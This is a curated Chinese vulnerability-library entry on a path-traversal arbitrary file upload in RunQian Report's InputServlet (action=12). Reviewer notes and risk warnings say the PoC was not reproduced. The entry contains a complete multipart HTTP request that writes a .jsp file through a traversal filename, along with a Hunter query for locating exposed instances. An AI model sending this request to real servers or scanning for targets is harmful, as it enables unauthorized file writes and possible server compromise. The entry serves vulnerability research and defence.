---
source: "wy876 漏洞文库"
title: "润乾报表 InputServlet action12 filename遍历上传"
product: "润乾报表"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "反斜杠路径暗示Windows，版本未知"
prerequisites: "无Cookie请求，鉴权未知"
side_effects: "请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/ekg0bvs3ogtplydg"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8/%E6%B6%A6%E4%B9%BE%E6%8A%A5%E8%A1%A8InputServlet%E5%AD%98%E5%9C%A8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "app.name="
hunter: "app.name=\"润乾报表平台\""
id: "vw-f0a9f89a5ae7977fccfd03fa"
entity_id: "ve-f0a9f89a5ae7977fccfd03fa"
schema_version: "1"
---

# 润乾报表 InputServlet action12 filename遍历上传

## 条目说明

- 对象与具体问题：润乾报表；InputServlet action12 filename遍历上传
- 版本、配置及部署条件：反斜杠路径暗示Windows，版本未知
- 认证与权限前提：无Cookie请求，鉴权未知
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 跨平台产品介绍不能使反斜杠样例自动适用全部OS，需路径规范化环境
- 文件内容123只验证写入非JSP执行，/2211.jsp无响应
- action12/upsize/filename输入对应写入入口，应与action13读区分
- 无版本/修复，写入可能覆盖需清理

## 操作风险

请求可能删除/覆盖数据、修改账号或持久改变业务状态；文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

## 一、漏洞简介
润乾报表是一个纯JAVA的企业级报表工具支持对J2EE系统的嵌入式部署，无缝集成。服务器端支持各种常见的操作系统，提供高效的报表设计方案、强大的报表展现能力、灵活的部署机制，支持强关联语义模型，并且具备强有力的填报功能和olap分析，为企业级数据分析与商业智能提供了高性能、高效率的报表系统解决方案。润乾报表InputServlet存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器权限。

## 二、影响版本
+ 润乾报表

## 三、资产测绘
+ hunter`app.name="润乾报表平台"`
+ 特征


## 四、漏洞复现
```http
POST /InputServlet?action=12 HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
Content-Type: multipart/form-data; boundary=00content0boundary00
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close

--00content0boundary00
Content-Disposition: form-data; name="upsize"

1024
--00content0boundary00
Content-Disposition: form-data; name="file"; filename="/\..\\..\\..\2211.jsp"
Content-Type: image/jpeg

123
--00content0boundary00--
```

> 请求长度说明：原资料 Content-Length 为 241；静态长度已移除，应由客户端根据最终请求体的字节数生成。


文件上传位置

```java
/2211.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/ekg0bvs3ogtplydg>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
